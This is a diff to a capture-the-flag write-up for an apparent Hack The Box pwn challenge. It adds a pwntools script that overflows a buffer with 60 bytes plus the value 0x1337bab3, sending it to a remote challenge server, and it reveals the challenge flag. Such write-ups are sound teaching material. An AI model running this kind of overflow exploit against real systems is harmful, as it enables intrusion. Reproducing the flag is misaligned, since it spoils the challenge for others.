@@ -59,7 +59,36 @@ How are you doing, sir?
 12. Based from the `main()` function, we need to overwrite the `local_c` values so to **0x1337bab3** so we can get the flag.
 13. To solve this we can convert the hex in little-endian format -> \xb3\xba\x37\x13.
 14. Then add them after the 60 bytes.
+15. For this solution, i made a python script using pwntools.
+
+> THE SCRIPT
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+context.log_level = 'debug'
+#sh = remote('68.183.47.198',31162) #68.183.47.198:31162
+sh = process("nc")
+sh.sendline("68.183.47.198 31162")
+p = b'A' * 60
+p += p64(322419379) # 0x1337bab3
+#sh.recvuntil("? ")
+sh.sendline(p)
+sh.interactive()
+```
+
+> OUTPUT
+
+![image](https://user-images.githubusercontent.com/70703371/209359846-75879f05-0888-475d-aeb6-0c2d07325684.png)
+
+
+16. Got the flag!
+
+## FLAG
 
 ```
-aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa\xb3\xba\x37\x13
+HTB{w3lc0me_t0_lAnd_0f_pwn_&_pa1n!}
 ```
+
